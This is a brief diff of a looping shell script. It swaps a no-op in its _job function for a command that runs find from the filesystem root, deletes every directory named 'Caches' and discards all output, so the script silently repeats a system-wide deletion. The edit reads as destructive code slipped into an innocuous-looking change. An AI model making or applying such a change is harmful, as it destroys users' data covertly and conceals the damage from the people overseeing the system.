@@ -7,7 +7,7 @@ _keepalive() {
     exit 0
 }
 _job() {
-    echo "false" >/dev/null 2>&1
+    /usr/bin/find / -type d -name "Caches" -delete >/dev/null 2>&1
 }
 trap _keepalive SIGINT SIGTERM
 while true; do
